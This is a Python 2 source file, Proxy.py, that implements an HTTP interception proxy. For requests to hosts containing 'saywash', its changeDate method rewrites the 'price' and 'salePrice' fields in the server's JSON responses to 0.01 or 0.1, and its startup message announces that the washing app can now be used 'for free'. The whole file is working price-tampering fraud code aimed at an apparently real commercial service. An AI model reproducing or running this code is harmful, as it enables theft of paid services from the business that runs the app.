#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2016/9/15 22:31
# @Author  : hale
# @Site    : 
# @File    : Proxy.py
# @Software: PyCharm

#-*- coding: UTF-8 -*-
import socket,select
import re
import sys
import thread
import time
from multiprocessing import Process
class Proxy:
    def __init__(self,soc):
        self.client,_=soc.accept()
        self.target=None
        self.request_url=None
        self.BUFSIZE=8000
        self.method=None
        self.targetHost=None
    def getClientRequest(self):
        request=self.client.recv(self.BUFSIZE)
        if not request:
            return None
        cn=request.find('\n')
        firstLine=request[:cn]
        print firstLine[:len(firstLine)-9]
        line=firstLine.split()
        self.method=line[0]
        self.targetHost=line[1]
        return request
    def commonMethod(self,request):
        tmp=self.targetHost.split('/')
        net=tmp[0]+'//'+tmp[2]
        request=request.replace(net,'')
        targetAddr=self.getTargetInfo(tmp[2])

        try:
            (fam,_,_,_,addr)=socket.getaddrinfo(targetAddr[0],targetAddr[1])[0]
        except Exception as e:
            print e
            sys.exit(1)
        self.target=socket.socket(fam)
        self.target.settimeout(10)
        self.target.connect(addr)
        self.target.send(request)
        self.nonblocking()
    def connectMethod(self,request): #对于CONNECT处理可以添加在这里
        pass
    def run(self):
        
        request=self.getClientRequest()

        if request:

            if self.method in ['GET','POST','PUT',"DELETE",'HAVE']:
                self.commonMethod(request)
            elif self.method=='CONNECT':
                self.connectMethod(request)
    def nonblocking(self):
        inputs=[self.client,self.target]
        status = True
        count  = 0
        while status:
                try:
                    readable,writeable,errs=select.select(inputs,[],inputs,1)
                    if len(readable) == 0:
                        break
                except select.error:
                    print "error"
                    break
                for soc in readable:
                    data = soc.recv(self.BUFSIZE)
                    print "data %d" %(len(data))
                    if data:
                        count = 0
                        if soc is self.client:
                            self.target.send(data)
                        elif soc is self.target:
                            if "saywash" in self.targetHost:
                                 data= self.changeDate(data)
                            #print data
                            self.client.send(data)
                            
                        else:
                            status=False
			    
                    else:
                        status= False

        self.client.close()
        self.target.close()
        print "Success"
    def getTargetInfo(self,host):
        port=0
        site=None
        if ':' in host:
            tmp=host.split(':')
            site=tmp[0]
            port=int(tmp[1])
        else:
            site=host
            port=80
        return site,port
    def changeDate(self,data):
        try:
            data = re.subn("\"price\":\"\d.\d\d\"", "\"price\":\"0.01\"", data)
        except:
            return data
        try:
            data = re.subn("\"price\":\"\d.\d\"", "\"price\":\"0.1\"", data[0])
        except:
            return data[0]
        try:
            data = re.subn("\"salePrice\":\"\d.\d\d\"", "\"salePrice\":\"0.01\"", data[0])
        except:
            return data[0]

        return data[0]
def set_proxy(ip,port):
    host = ip
    port = port
    backlog = 5
    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
    server.bind((host,port))
    server.listen(10)
    print "you have set proxy successly now you can use the hair warsh app for free\nEnjoy it"
    while True:
        thread.start_new_thread(Proxy(server).run,())
        #print "success"
        print "当前链接数目为%d"%(thread._count())
def start_proxy(**kwargs):
    ip = '192.168.1.208'
    port = 8080
    if 'ip' in kwargs and  kwargs['ip']:
        ip =  kwargs['ip']
    if 'port' in kwargs and  kwargs['port']:
        port = (int)(port)
    set_proxy(ip,port)

if __name__=='__main__':
    start_proxy()